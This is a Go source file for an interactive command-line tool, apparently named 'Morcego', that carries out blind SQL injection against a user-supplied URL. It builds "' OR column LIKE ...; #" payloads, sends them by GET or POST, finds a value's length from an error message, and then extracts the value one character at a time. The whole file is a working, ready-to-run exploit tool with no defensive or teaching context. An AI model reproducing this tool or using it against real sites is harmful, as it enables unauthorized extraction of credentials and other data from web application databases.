package main

import (
	"bufio"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const colorReset = "\033[0m"
const colorRed = "\033[31m"
const colorGreen = "\033[32m"
const colorBlue = "\033[34m"

const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-!?@%"

var reader = bufio.NewReader(os.Stdin)

func handleError(message string, err error) {
	if err != nil {
		log.Fatal(message, "\n", err)
	}
}

func showHeader() {
	fmt.Print(colorRed)
	fmt.Println(`

  ███▄ ▄███▓ ▒█████   ██▀███   ▄████▄  ▓█████   ▄████  ▒█████  
 ▓██▒▀█▀ ██▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀  ██▒ ▀█▒▒██▒  ██▒
 ▓██    ▓██░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███   ▒██░▄▄▄░▒██░  ██▒
 ▒██    ▒██ ▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ ░▓█  ██▓▒██   ██░
 ▒██▒   ░██▒░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒░▒▓███▀▒░ ████▓▒░
 ░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░ ░▒   ▒ ░ ▒░▒░▒░ 
 ░  ░      ░  ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░  ░   ░   ░ ▒ ▒░ 
 ░      ░   ░ ░ ░ ▒    ░░   ░ ░           ░   ░ ░   ░ ░ ░ ░ ▒  
        ░       ░ ░     ░     ░ ░         ░  ░      ░     ░ ░  
				                             ░                                
`)

}

func askFor(message string, validValues ...string) string {
	if len(validValues) != 0 {
		message = fmt.Sprintf("%s %v", message, validValues)
	}
	fmt.Printf("  %s-> %s:%s ", colorBlue, message, colorReset)
	line, err := reader.ReadString('\n')
	handleError("Cannot read user input", err)
	line = strings.TrimSuffix(line, "\n")
	if len(validValues) == 0 {
		return line
	} else {
		line = strings.ToUpper(line)
		for _, value := range validValues {
			if strings.ToUpper(value) == line {
				return line
			}
		}
		handleError("Invalid value", errors.New(fmt.Sprintf("Valid values: %v", validValues)))
	}
	return ""
}

func doGet(targetUrl string) string {
	res, err := http.Get(targetUrl)
	handleError("Cannot do get", err)

	defer res.Body.Close()

	bytes, err := ioutil.ReadAll(res.Body)
	handleError("Cannot read body", err)

	return string(bytes)
}

func postForm(targetUrl string, values url.Values) string {
	res, err := http.PostForm(targetUrl, values)
	handleError("Cannot post form", err)

	defer res.Body.Close()

	bytes, err := ioutil.ReadAll(res.Body)
	handleError("Cannot read body", err)

	return string(bytes)
}

func doRequest(testValuePattern, targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions string) string {
	var prefix string
	if valueType == "STRING" {
		prefix = "'"
	} else {
		prefix = "0"
	}

	if method == "POST" {
		attempt := fmt.Sprintf("%s OR %s LIKE '%s' %s; #", prefix, targetColumn, testValuePattern, extraConditions)
		values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
		handleError("Cannot create values", err)
		return postForm(targetUrl, values)
	} else {
		getUrl := strings.TrimSuffix(targetUrl, "/")
		var suffix string
		if inputName != "" {
			if valueType == "STRING" {
				prefix = fmt.Sprintf("?%s='", inputName)
			} else {
				prefix = fmt.Sprintf("?%s=0", inputName)
			}
			if extraInputs != "" {
				suffix = fmt.Sprintf("&%s", extraInputs)
			}
		}
		content := fmt.Sprintf(" OR %s LIKE '%s' %s", targetColumn, testValuePattern, extraConditions)
		attempt := prefix
		if inputName == "" {
			attempt += content
		} else {
			attempt += url.QueryEscape(content)
		}
		attempt += suffix
		getUrl = fmt.Sprintf("%s/%s", getUrl, attempt)
		return doGet(getUrl)
	}
}

func fetchSize(targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions, errorMessage string) int {
	test := func(size int) bool {
		body := doRequest(strings.Repeat("_", size), targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions)
		return !strings.Contains(body, errorMessage)
	}
	size := 0
	result := false
	for !result {
		size++
		result = test(size)
	}
	return size
}

func fetchValue(size int, targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions, errorMessage string) {
	check := func(index int, char string) bool {
		pattern := strings.Repeat("_", index)
		pattern += char
		pattern += strings.Repeat("_", size-index-1)
		body := doRequest(pattern, targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions)
		return !strings.Contains(body, errorMessage)
	}

	fmt.Printf("   %s=> ", colorGreen)
	for i := 0; i < size; i++ {
		found := false
		for _, char := range chars {
			str := string(char)
			if str == "_" {
				str = "\\_"
			} else if str == "%" {
				str = "\\%"
			}
			if check(i, str) {
				fmt.Print(string(char))
				found = true
				break
			}
		}
		if !found {
			fmt.Printf("%s?%s", colorRed, colorGreen)
		}
	}
}

func attack() {
	var inputName, extraInputs string

	targetUrl := askFor("URL")
	method := askFor("Method", "POST", "GET")
	valueType := askFor("Value type", "STRING", "INT")
	targetColumn := askFor("Target column")
	if method == "POST" {
		inputName = askFor("Vulnerable input name")
	} else {
		inputName = askFor("Vulnerable input name (leave empty to PATH values)")
	}
	if method == "POST" || inputName != "" {
		extraInputs = askFor("Extra inputs (pass=1234&something=321)")
	}
	extraConditions := askFor("Extra conditions (`AND username='john doe', leave empty to none)")
	errorMessage := askFor("Error message")

	size := fetchSize(targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions, errorMessage)

	fmt.Print(colorBlue)
	fmt.Println(`
       _,    _   _    ,_
  .o888P     Y8o8Y     Y888o.
 d88888      88888      88888b
d888888b_  _d88888b_  _d888888b
8888888888888888888888888888888
8888888888888888888888888888888
YJGS8P"Y888P"Y888P"Y888P"Y8888P
 Y888   '8'   Y8P   '8'   888Y
  '8o          V          o8'
    '                     '
		`)
	fmt.Printf("   %s=> Size: %d\n", colorGreen, size)

	needValue := askFor("Fetch value?", "Y", "N")

	if needValue == "N" {
		return
	}

	fetchValue(size, targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions, errorMessage)

	fmt.Println()
}

func main() {
	showHeader()
	attack()
}
